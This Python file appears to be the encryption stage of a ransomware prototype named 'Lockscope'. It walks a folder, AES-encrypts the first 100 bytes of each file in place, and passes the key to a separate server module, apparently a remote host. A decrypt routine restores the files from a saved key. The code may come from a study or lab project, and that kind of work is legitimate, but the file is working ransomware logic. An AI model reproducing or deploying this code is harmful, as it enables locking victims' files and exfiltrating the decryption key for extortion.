
import pickle
import pathlib
import Server

from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


class AEScipher:

    # Initialization of variables
    def __init__(self): 
        self.block_size = 32
        self.key_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\key.pkl"
        self.files_path = pathlib.Path(r"C:\Users\User\Desktop\Test Files")
        self.size_bytes_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\size_bytes.txt"
        self.iv_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\iv.txt"

    # Generate the AES key
    def generate_aes_key(self):
        aes_key = Random.new().read(self.block_size)
        
        return aes_key

    # Open the plain file and read data
    def open_file(self, path):

        with open(path, "rb") as f:
            f.seek(100)
            rest_content = f.read()
        
        with open(path, "rb") as f:
            cipher_data = f.read(100)

        return cipher_data, rest_content

    # Funtion to encrypt the data with AES key
    def encrypt(self):

        print("\n-----ENCRYPT FILE-----")

        aes_key = self.generate_aes_key()

        iv = get_random_bytes(16)

        with open(self.iv_path, "wb") as iv_file:
            iv_file.write(iv)

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        
        for files in self.files_path.iterdir():

            if files.is_file():

                cipher_data, rest_content = self.open_file(files)

                cipher_content = pad(cipher_data, self.block_size)
                
                print("\n")
                print("Contenido del archivo a cifrar:\n" , cipher_data)
                print("Resto del contenido del archivo:\n" , rest_content)
                print("Conenido del archivo a cifrar tras aplicar padding:\n" , cipher_content)
                print("Cantidad de carácteres tras aplicar padding:\n" , len(cipher_content))

                encrypted_data = cipher.encrypt(cipher_content)

                print("Contenido del archivo encriptado:\n" , encrypted_data)

                print("Cantidad de carácteres del archivo encriptado:\n" , len(encrypted_data))

                with open(self.size_bytes_path, "w") as content_size:
                    content_size.write(str(len(encrypted_data)))

                concat_bytes = encrypted_data + rest_content

                print("\n")
                print("Contenido del archivo a cifrar una vez encriptado:\n" , encrypted_data)
                print("Resto del contenido del archivo:\n" , rest_content)

                with open(files, "wb") as encrypted_file:
                    encrypted_file.write(concat_bytes)
                
                print("\nContenido del archivo al completo una vez cifrado:\n" , concat_bytes)

                concat_bytes = b'\x00'
                encrypted_data = b'\x00'
                cipher_content = b'\x00'
                cipher_data = b'\x00'
                rest_content = b'\x00'

        Server.client(aes_key)
        Server.receiver()


    # Open the cipher file and read data
    def open_file_encrypted(self, path):

        with open(self.size_bytes_path, "r") as content_size:
            size_encrypted_data = int(content_size.read())

        with open(path, "rb") as f:
            f.seek(size_encrypted_data)
            rest_content = f.read()
        
        with open(path, "rb") as f:
            cipher_data = f.read(size_encrypted_data)

        return cipher_data, rest_content
    
    # Funtion to decrypt the data with AES key
    def decrypt(self):
        
        print("\n-----DECRYPT FILE-----")

        with open(self.key_path, "rb") as key_file:
            aes_key = key_file.read()

        with open(self.iv_path, "rb") as iv_file:
            iv = iv_file.read()

        cipher = AES.new(aes_key, AES.MODE_CBC, iv)

        for files in self.files_path.iterdir():

            if files.is_file():

                cipher_data, rest_content = self.open_file_encrypted(files)

                print("\n")
                print("Contenido del archivo a cifrar una vez encriptado:\n" , cipher_data)
                print("Resto del contenido del archivo:\n" , rest_content)

                file_bytes_decrypted = cipher.decrypt(cipher_data)

                print("Contenido del archivo a cifrar una vez quitado el padding:\n" , file_bytes_decrypted)

                decrypted_data = unpad(file_bytes_decrypted, self.block_size)

                print("Contenido del archivo tras quitar el padding:\n" , decrypted_data)
                print("Cantidad de carácteres una vez quitado el padding:\n" , len(decrypted_data))

                concat_bytes_decrypted = decrypted_data + rest_content

                with open(files, "wb") as plain_file:
                    plain_file.write(concat_bytes_decrypted)
                
                print("\nContenido del archivo al completo una vez descifrado:\n" , concat_bytes_decrypted)
            
                file_bytes_decrypted = b'\x00'
                decrypted_data = b'\x00'
                concat_bytes_decrypted = b'\x00'
                cipher_data = b'\x00'
                rest_content = b'\x00'

            
 
if __name__ == '__main__':
    cipher = AEScipher()
    try:
        cipher.encrypt()
        cipher.decrypt()

    except KeyboardInterrupt:
        exit(1)

    
